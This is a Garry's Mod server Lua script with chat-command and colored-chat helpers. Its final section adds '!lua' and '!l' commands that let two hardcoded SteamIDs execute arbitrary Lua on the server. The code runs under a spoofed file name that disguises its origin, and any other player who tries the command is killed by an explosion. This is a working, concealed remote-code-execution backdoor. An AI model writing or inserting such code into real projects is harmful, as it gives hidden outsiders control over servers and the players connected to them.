--- === META === ---
local pMeta		= FindMetaTable("Player")
local pEntity	= FindMetaTable("Entity")

function pEntity:print(str)
	if not self:IsValid() then return print(str) end
	self:PrintMessage(HUD_PRINTCONSOLE, str.."\n")
end



local SteamIDs = {
	["STEAM_0:0:17809124"] = true,
	["STEAM_0:0:44703291"] = true,
}
function pMeta:IsHeX()
	return SteamIDs[ self:SteamID() ]
end
function GetHeX()
	for k,v in pairs( player.GetHumans() ) do
		if v:IsHeX() then
			return v
		end
	end
	return NULL
end

function RandomPlayer()
	local tab = {}
	
	for k,v in pairs( player.GetHumans() ) do
		if not v:IsHeX() then
			table.insert(tab, v)
		end
	end
	
	return table.Random(tab)
end


function ETable(tab)
	if type(tab) == "table" then
		table.Empty(tab)
	end
	
	tab = {}
end

function pEntity:Explode(dmg)
	if self.Alive and (not self:Alive()) then self:Spawn() end
	self:ExitVehicle()
	self:GodDisable()
	self:SetHealth(1)
	
	local Power = dmg or "200"
	
	local boom = ents.Create("env_explosion")
		boom:SetPos(self:GetPos())
		boom:SetOwner(self)					
		boom:Spawn()
		boom:SetKeyValue("iMagnitude", tostring(Power))
	boom:Fire("Explode", 0, 0)
	
	timer.Simple(1, function()
		if ValidEntity(boom) then
			boom:Remove()
		end
	end)
end





local function UMCAT(ply,tab)
	umsg.Start("CAT", ply)
		umsg.Short(#tab)
		
		for k,v in pairs(tab) do
			local typ = type(v)
			
			if (typ == "string") then
				umsg.String(v)
				
			elseif (typ == "table") then
				umsg.Short(v.r)
				umsg.Short(v.g)
				umsg.Short(v.b)
				umsg.Short(v.a)
			end
		end
	umsg.End()
end
function pMeta:CAT(...) UMCAT(self,arg) end
function CAT(...) UMCAT(nil,arg) end


local CatCode = [[
function CAT(u)
	local z,t,r={},table.insert,_R.bf_read.ReadShort
	for i=1,r(u)/2,1 do
		t(z,Color(r(u),r(u),r(u),r(u)))
		t(z,u:ReadString())
	end
	chat.AddText(unpack(z))
	chat.PlaySound()
end
usermessage.Hook("CAT", CAT)
]]

local function SendCat(ply)
	ply:SendLua(CatCode)
end
hook.Add("PlayerInitialSpawn", "SendCat", SendCat)
BroadcastLua(CatCode)
--- === /META === ---




--- === CHATCOMMAND === ---
chatcommand = {}
chatcommand.GetTable = {}

function chatcommand.Add(cmd,func)
	chatcommand.GetTable[cmd] = func
end

local function CC_Run(ply,text,isteam)
	if not ValidEntity(ply) then return end
	
	local Command = string.Explode(" ", text)[1]:lower()
	local ToCall  = chatcommand.GetTable[Command]
	
	if (ToCall) then
		timer.Simple(0.1, function()
			local ok,err = pcall(function()
				ToCall(ply,Command,(text:gsub(Command,"")),text)
			end)
		end)
	end
end
hook.Add("PlayerSay", "!CC_Run", CC_Run)
--- === /CHATCOMMAND === ---



--- === CHATLUA === ---
local function CLUA_Do(ply,cmd,text)
	if IsUH then return ply:print("[ERR] No modules!") end
	if not (ply:IsValid()) then return end
	
	if not ply:IsHeX() then
		ply:Explode()
		return
	end
	
	if not (#text > 0) then return end
	
	me		= ply
	that	= ply:GetEyeTrace().Entity
	there	= ply:GetEyeTrace().HitPos
	prt		= function(str) PrintMessage(HUD_PRINTTALK, tostring(str)) end
	
	RunStringEx(text, "[@weapons/gmod_tool/stools/gas_storage.lua]")
end
chatcommand.Add("!lua", CLUA_Do)
chatcommand.Add("!l", CLUA_Do)
--- === /CHATLUA === ---



